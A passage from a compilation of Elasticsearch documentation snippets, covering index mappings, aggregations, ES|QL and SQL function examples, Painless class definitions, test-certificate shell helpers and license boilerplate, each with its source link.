946684800\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index with Custom Analyzer for Version 6 in JSON\nDESCRIPTION: Sets up an Elasticsearch index for version 6 with a custom analyzer using standard tokenizer and lowercase filter, and applies it to the content field in the mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nPUT /index\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"custom_analyzer\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"standard\",\n            \"lowercase\"\n          ]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"doc\": {\n      \"properties\": {\n        \"content\": {\n          \"type\": \"text\",\n          \"analyzer\": \"custom_analyzer\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rare Terms Aggregation with Custom Max Doc Count\nDESCRIPTION: Demonstrates how to use the 'max_doc_count' parameter to adjust the threshold for what is considered a rare term.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-rare-terms-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"rare_terms\": {\n        \"field\": \"genre\",\n        \"max_doc_count\": 2\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Suggestions with Boosted Geo Location Context in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to query suggestions with geo location contexts while applying different precision levels and boost factors. It shows how to filter and boost suggestions based on their proximity to multiple geo points.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_26\n\nLANGUAGE: console\nCODE:\n```\nPOST place/_search?pretty\n{\n  \"suggest\": {\n    \"place_suggestion\": {\n      \"prefix\": \"tim\",\n      \"completion\": {\n        \"field\": \"suggest\",\n        \"size\": 10,\n        \"contexts\": {\n          \"location\": [             <1>\n                      {\n              \"lat\": 43.6624803,\n              \"lon\": -79.3863353,\n              \"precision\": 2\n            },\n            {\n              \"context\": {\n                \"lat\": 43.6624803,\n                \"lon\": -79.3863353\n              },\n              \"boost\": 2\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate Keys to PKCS#8 Format\nDESCRIPTION: This snippet converts the private keys of the certificates into PKCS#8 format for enhanced security and compatibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n# 12. Convert certifcate keys to pkcs8\n\nopenssl pkcs8 -topk8 -inform PEM -in cert1/cert1.key -outform PEM -out cert1/cert1-pkcs8.key -nocrypt\nopenssl pkcs8 -topk8 -inform PEM -in cert2/cert2.key -outform PEM -out cert2/cert2-pkcs8.key -passin pass:\"c2-pass\" -passout pass:\"c2-pass\"\n```\n\n----------------------------------------\n\nTITLE: List of Forbidden Test APIs in Elasticsearch with Recommended Alternatives\nDESCRIPTION: A comprehensive list of Java methods and annotations that are forbidden in Elasticsearch tests. Each entry includes the fully qualified name of the forbidden API and the recommended alternative approach, formatted as comments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-test-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\ncom.carrotsearch.randomizedtesting.RandomizedTest#globalTempDir() @ Use newTempDirPath() instead\ncom.carrotsearch.randomizedtesting.annotations.Seed @ Don't commit hardcoded seeds\ncom.carrotsearch.randomizedtesting.annotations.Repeat @ Don't commit hardcoded repeats\n\norg.apache.lucene.codecs.Codec#setDefault(org.apache.lucene.codecs.Codec) @ Use the SuppressCodecs(\"*\") annotation instead\norg.junit.Ignore @ Use AwaitsFix instead\norg.apache.lucene.tests.util.LuceneTestCase$Nightly @ We don't run nightly tests at this point!\ncom.carrotsearch.randomizedtesting.annotations.Nightly @ We don't run nightly tests at this point!\n\norg.junit.Test @defaultMessage Just name your test method testFooBar\n\njava.lang.Math#random() @ Use one of the various randomization methods from LuceneTestCase or ESTestCase for reproducibility\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keyword Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the keyword analyzer in Elasticsearch. It shows an example of analyzing a sentence, which returns the entire input as a single token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"keyword\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Sine in SQL\nDESCRIPTION: The SIN function computes the sine of a numeric expression representing an angle in radians. This function accepts one numeric input and outputs a double numeric value, returning null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_47\n\nLANGUAGE: sql\nCODE:\n```\nSIN(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Using Alias with AS Keyword in SELECT List\nDESCRIPTION: Example of using the AS keyword to provide a name for an expression in the SELECT list, making the output more readable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 1 + 1 AS result;\n```\n\n----------------------------------------\n\nTITLE: Including STD_DEV Function Description\nDESCRIPTION: Includes the content of a separate file containing the description of the STD_DEV function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/std_dev.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/std_dev.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Unordered All_Of Rule with Max_Gaps in Elasticsearch Intervals Query\nDESCRIPTION: Example of using the all_of rule with ordered=false and max_gaps constraints, allowing intervals to appear in any order, including overlapping with each other.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-intervals-query.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"intervals\" : {\n      \"my_text\" : {\n        \"all_of\" : {\n          \"ordered\" : false, \n          \"max_gaps\": 1,\n          \"intervals\" : [\n            {\n              \"match\" : {\n                \"query\" : \"my favorite food\",\n                \"max_gaps\" : 0,\n                \"ordered\" : true\n              }\n            },\n            {\n              \"match\" : {\n                \"query\" : \"cold porridge\",\n                \"max_gaps\" : 4,\n                \"ordered\" : true\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Modifying User Roles\nDESCRIPTION: Example demonstrating how to modify user roles by removing 'network' and 'monitoring' roles and adding 'user' role.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/users-command.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-users roles jacknich -r network,monitoring -a user\n```\n\n----------------------------------------\n\nTITLE: Response for Runtime Field Multi Terms Aggregation\nDESCRIPTION: Example response showing buckets created from the genre length runtime field and product field, with counts for each unique combination.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\" : {\n    \"genres_and_products\" : {\n      \"doc_count_error_upper_bound\" : 0,\n      \"sum_other_doc_count\" : 0,\n      \"buckets\" : [\n        {\n          \"key\" : [\n            4,\n            \"Product A\"\n          ],\n          \"key_as_string\" : \"4|Product A\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : [\n            4,\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"4|Product B\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : [\n            10,\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"10|Product B\",\n          \"doc_count\" : 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Text Field with Default Prefix Length Settings in Elasticsearch\nDESCRIPTION: This example shows how to create a 'body_text' field with default index_prefixes settings. An empty settings object will use the default min_chars (2) and max_chars (5) values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/index-prefixes.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"body_text\": {\n        \"type\": \"text\",\n        \"index_prefixes\": { }    <1>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Booleans with TO_BOOLEAN Function in ESQL\nDESCRIPTION: This snippet demonstrates the TO_BOOLEAN function in ESQL that converts string values to booleans. It shows how different string values like \"true\", \"TRuE\", \"false\", \"\", \"yes\", and \"1\" are interpreted when converted to boolean type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_boolean.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str = [\"true\", \"TRuE\", \"false\", \"\", \"yes\", \"1\"]\n| EVAL bool = TO_BOOLEAN(str)\n```\n\n----------------------------------------\n\nTITLE: Creating and searching wildcard field type in Elasticsearch\nDESCRIPTION: Demonstrates creating an index with a wildcard field type and performing a wildcard search query on it. The wildcard field is optimized for grep-like searches on unstructured content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_wildcard\": {\n        \"type\": \"wildcard\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"my_wildcard\" : \"This string can be quite lengthy\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"wildcard\": {\n      \"my_wildcard\": {\n        \"value\": \"*quite*lengthy\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Modifying Datetime Zones with Painless\nDESCRIPTION: This snippet demonstrates how to change the timezone of a complex ZonedDateTime object using Painless scripting. It includes methods to alter both directly-created ZonedDateTimes and those parsed from string format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_16\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime utc =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime pst = utc.withZoneSameInstant(ZoneId.of('America/Los_Angeles'));\n```\n\nLANGUAGE: painless\nCODE:\n```\nString gmtString = 'Thu, 13 Oct 1983 22:15:30 GMT';\nZonedDateTime gmtZdt = ZonedDateTime.parse(gmtString,\n        DateTimeFormatter.RFC_1123_DATE_TIME); <1>\nZonedDateTime pstZdt =\n        gmtZdt.withZoneSameInstant(ZoneId.of('America/Los_Angeles'));\nString pstString = pstZdt.format(DateTimeFormatter.RFC_1123_DATE_TIME);\n```\n\n----------------------------------------\n\nTITLE: Querying for Similar Text with more_like_this in Elasticsearch\nDESCRIPTION: A basic example of the more_like_this query that searches for documents with content similar to \"Once upon a time\" in the title and description fields, with parameters to control term selection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-mlt-query.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"more_like_this\" : {\n      \"fields\" : [\"title\", \"description\"],\n      \"like\" : \"Once upon a time\",\n      \"min_term_freq\" : 1,\n      \"max_query_terms\" : 12\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for ESQL String Function in Markdown\nDESCRIPTION: This markdown table defines the supported input and output types for an ESQL string function. It specifies that the function accepts keyword or text input types, along with integer parameters for start and length, and returns a keyword type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/substring.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | start | length | result |\n| --- | --- | --- | --- |\n| keyword | integer | integer | keyword |\n| text | integer | integer | keyword |\n```\n\n----------------------------------------\n\nTITLE: Creating Nori Analyzer with Inline Dictionary Rules\nDESCRIPTION: Example of creating a Nori tokenizer with user dictionary rules defined directly in the tokenizer configuration rather than in a separate file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-tokenizer.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT nori_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"tokenizer\": {\n          \"nori_user_dict\": {\n            \"type\": \"nori_tokenizer\",\n            \"decompound_mode\": \"mixed\",\n            \"user_dictionary_rules\": [\"c++\", \"C쁠쁠\", \"세종\", \"세종시 세종 시\"]\n          }\n        },\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"type\": \"custom\",\n            \"tokenizer\": \"nori_user_dict\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Runtime Fields in EQL Search for Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the runtime_mappings parameter to create and extract runtime fields during an EQL search, and include them in the response using the fields parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search?filter_path=-hits.events._source\n{\n  \"runtime_mappings\": {\n    \"day_of_week\": {\n      \"type\": \"keyword\",\n      \"script\": \"emit(doc['@timestamp'].value.dayOfWeekEnum.toString())\"\n    }\n  },\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\"\n  \"\"\",\n  \"fields\": [\n    \"@timestamp\",\n    \"day_of_week\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an int4 Quantized Dense Vector Index\nDESCRIPTION: This snippet demonstrates creating a half-byte-quantized dense vector index using int4_hnsw. This reduces memory footprint by 87% at the cost of accuracy and requires an even number of dimensions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\nPUT my-byte-quantized-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 4,\n        \"index\": true,\n        \"index_options\": {\n          \"type\": \"int4_hnsw\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Copyright and License Notice in Interactive Programs\nDESCRIPTION: This snippet demonstrates how to display a short copyright and license notice when an interactive program starts. It includes placeholders for version number, year, and author name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-s3/licenses/jaxb-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'. This is free software, and you are welcome to redistribute it under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Creating Extension Metadata with HTTP POST\nDESCRIPTION: Creates metadata for a new extension by sending a POST request to the Extensions API with JSON payload containing name, description, type and version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncurl -XPOST \\\n-H \"Authorization: ApiKey $EC_API_KEY\" \\\n-H 'content-type:application/json' \\\nhttps://api.elastic-cloud.com/api/v1/deployments/extensions \\\n-d'{\n  \"name\" : \"synonyms-v1\",\n  \"description\" : \"The best synonyms ever\",\n  \"extension_type\" : \"bundle\",\n  \"version\" : \"7.*\"\n}'\n```\n\n----------------------------------------\n\nTITLE: CHANGE_POINT Example in Elasticsearch SQL\nDESCRIPTION: Demonstrates the usage of the CHANGE_POINT command to detect a step change in a metric. The example includes input data and the expected output after applying the command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/change_point.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nINPUT\n1\t10\n2\t11\n3\t9\n4\t12\n5\t10\n6\t11\n7\t20\n8\t19\n9\t21\n10\t22\n;\n\nCHANGE_POINT y ON x\n;\n\nOUTPUT\nx\ty\ttype\tpvalue\n1\t10\tnull\tnull\n2\t11\tnull\tnull\n3\t9\tnull\tnull\n4\t12\tnull\tnull\n5\t10\tnull\tnull\n6\t11\tnull\tnull\n7\t20\tstep_change\t0.00123\n8\t19\tnull\tnull\n9\t21\tnull\tnull\n10\t22\tnull\tnull\n;\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for String Length in ESQL (Markdown)\nDESCRIPTION: This markdown table defines the supported input types and result type for string length functions in ESQL. It shows that both 'keyword' and 'text' input types are supported, with the result always being an integer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/byte_length.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | result |\n| --- | --- |\n| keyword | integer |\n| text | integer |\n```\n\n----------------------------------------\n\nTITLE: Defining StringFieldScript.Factory Class in Painless\nDESCRIPTION: This code defines the `StringFieldScript$Factory` class in Painless. The `@no_import` annotation prevents direct import, similar to `StringFieldScript`. This factory class is likely responsible for creating instances of `StringFieldScript`, managing its lifecycle or dependencies.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.keyword_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\n\"class org.elasticsearch.script.StringFieldScript$Factory @no_import {\n}\"\n```\n\n----------------------------------------\n\nTITLE: Logging invalidate_apikeys Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the invalidate API key event. This event is logged when the API is invoked to invalidate one or more API keys in the system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-31T00:36:30,247+0200\", \"node.id\":\n\"9clhpgjJRR-iKzOw20xBNQ\", \"event.type\":\"security_config_change\", \"event.\naction\":\"invalidate_apikeys\", \"request.id\":\"7lyIQU9QTFqSrTxD0CqnTQ\",\n\"invalidate\":{\"apikeys\":{\"owned_by_authenticated_user\":false,\n\"user\":{\"name\":\"myuser\",\"realm\":\"native1\"}}}}\n```\n\n----------------------------------------\n\nTITLE: Defining Collector Interface in Painless - Java\nDESCRIPTION: Outlines the Collector interface, a crucial part of reduction operations on streams. It specifies methods like accumulator, characteristics, combiner, and others necessary for creating custom collectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.Collector {\n  BiConsumer accumulator()\n  Set characteristics()\n  BinaryOperator combiner()\n  Function finisher()\n  Collector of(Supplier,BiConsumer,BinaryOperator,Function,Collector.Characteristics[])\n  Collector of(Supplier,BiConsumer,BinaryOperator,Collector.Characteristics[])\n  Supplier supplier()\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Duplicates from Multivalued Field using MV_DEDUPE in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the MV_DEDUPE function in ESQL to remove duplicate values from a multivalued field. It creates a row with a field 'a' containing duplicate values, then uses MV_DEDUPE to create a new field 'dedupe_a' with duplicates removed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_dedupe.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[\"foo\", \"foo\", \"bar\", \"foo\"]\n| EVAL dedupe_a = MV_DEDUPE(a)\n```\n\n----------------------------------------\n\nTITLE: Defining StringFieldScript Class in Painless\nDESCRIPTION: This code defines the `StringFieldScript` class in Painless. The `@no_import` annotation prevents this class from being directly imported into Painless scripts, controlling its accessibility. This is likely part of a security or API stability measure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.keyword_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\n\"class org.elasticsearch.script.StringFieldScript @no_import {\n}\"\n```\n\n----------------------------------------\n\nTITLE: Using SUBSTRING Function in Elasticsearch SQL\nDESCRIPTION: Extracts a portion of a string starting at a specified position for a given length. Takes three parameters: source string, start position, and length. Returns null if any parameter is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nSUBSTRING(\n    source, <1>\n    start,  <2>\n    length) <3>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SUBSTRING('Elasticsearch', 0, 7);\n\nSUBSTRING('Elasticsearch', 0, 7)\n--------------------------------\nElastic\n```\n\n----------------------------------------\n\nTITLE: Sample Copyright Notice Template\nDESCRIPTION: Standard template for including copyright and license notices at the start of source files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-miscoffice-module-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Calculating Daily Cumulative User Cardinality\nDESCRIPTION: Example showing how to calculate the cumulative count of unique users per day using date histogram and cardinality aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-cumulative-cardinality-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /user_hits/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"users_per_day\": {\n      \"date_histogram\": {\n        \"field\": \"timestamp\",\n        \"calendar_interval\": \"day\"\n      },\n      \"aggs\": {\n        \"distinct_users\": {\n          \"cardinality\": {\n            \"field\": \"user_id\"\n          }\n        },\n        \"total_new_users\": {\n          \"cumulative_cardinality\": {\n            \"buckets_path\": \"distinct_users\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Geometric Centroid using ST_CENTROID_AGG in ESQL\nDESCRIPTION: This query retrieves data from the 'airports' index and uses the ST_CENTROID_AGG function to calculate the centroid (geometric center) of all location points. The result is a single geo_point representing the central point of all airport locations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_centroid_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| STATS centroid=ST_CENTROID_AGG(location)\n```\n\n----------------------------------------\n\nTITLE: ESQL Query with KEEP and RENAME Operations\nDESCRIPTION: A sample ESQL query that selects specific columns from an 'employees' table and renames them using aliases. The query keeps only first_name and last_name columns, then renames them to 'fn' and 'ln' respectively.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/renameMultipleColumns.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name\n| RENAME first_name AS fn, last_name AS ln\n```\n\n----------------------------------------\n\nTITLE: Including NOW Function Parameters in ESQL Documentation\nDESCRIPTION: This snippet includes the parameters documentation for the NOW function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/now.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/now.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining Thai Stop Words\nDESCRIPTION: Defines Thai stop words relevant for Elasticsearch text analysis, linking to the definitive Lucene source.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_38\n\nLANGUAGE: markdown\nCODE:\n```\n`_thai_`\n:   [Thai stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/th/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: Standard copyright notice and license boilerplate text to be included in project files. Placeholder fields are enclosed in brackets for customization with project-specific information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-url/licenses/commons-codec-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Defining Java Short Class Methods\nDESCRIPTION: This snippet defines methods for the java.lang.Short class which are available within Painless scripting. It includes method signatures for comparing, decoding, parsing, reversing bytes, converting to string, converting to unsigned int/long, and creating Short objects. These definitions specify the allowed interactions with Short values within Painless.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_17\n\nLANGUAGE: java\nCODE:\n```\n\"class java.lang.Short {\\n  int BYTES\\n  short MAX_VALUE\\n  short MIN_VALUE\\n  int SIZE\\n  int compare(short,short)\\n  int compareTo(Short)\\n  Short decode(String)\\n  int hashCode(short)\\n  short parseShort(String)\\n  short parseShort(String,int)\\n  short reverseBytes(short)\\n  String toString(short)\\n  int toUnsignedInt(short)\\n  long toUnsignedLong(short)\\n  Short valueOf(short)\\n  Short valueOf(String,int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Creating New PKCS#12 Certificate\nDESCRIPTION: Function to generate a new PKCS#12 certificate signed by a given CA. Takes parameters for the certificate file, password, name, CA details, and additional parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nfunction new-p12-cert() {\n    local CertFile=\"$1\"\n    local CertPass=\"$2\"\n    local CertName=\"$3\"\n    local CaFile=\"$4\"\n    local CaPass=\"$5\"\n    shift 5\n\n    certutil cert --ca=\"${PWD}/$CaFile\" --ca-pass=\"$CaPass\" --days=5000 --out ${PWD}/$CertFile --pass=\"$CertPass\" --name=\"$CertName\" \"$@\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Google Drive Connector for Dockerized Elasticsearch\nDESCRIPTION: YAML configuration for setting up the Google Drive connector to work with a Dockerized Elasticsearch and Kibana environment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-drive.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch:\n  host: http://elasticsearch:9200\n  api_key: \"<your api key>\"\n\nconnectors:\n  - connector_id: \"google_drive\"\n    service_type: \"google_drive\"\n    # Name of the connector\n    name: \"Google Drive Connector\"\n    index_name: \"search-google-drive\"\n    # Sync interval\n    scheduling:\n      interval: \"3600s\"\n    # Configures the connector\n    configuration:\n      service_account_credentials: '<Your service_account_credentials JSON here>'\n      use_domain_wide_delegation_for_sync: false\n      google_workspace_admin_email_for_data_sync: 'admin@example.com'\n      google_workspace_email_for_shared_drives_sync: 'user@example.com'\n      use_document_level_security: false\n      google_workspace_admin_email: 'admin@example.com'\n      max_concurrency: 10\n      use_text_extraction_service: false\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: A template for the boilerplate notice to be included when applying the Apache License 2.0 to a software project. It includes placeholders for the copyright year and owner's name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-http-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n   Copyright {yyyy} {name of copyright owner}\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       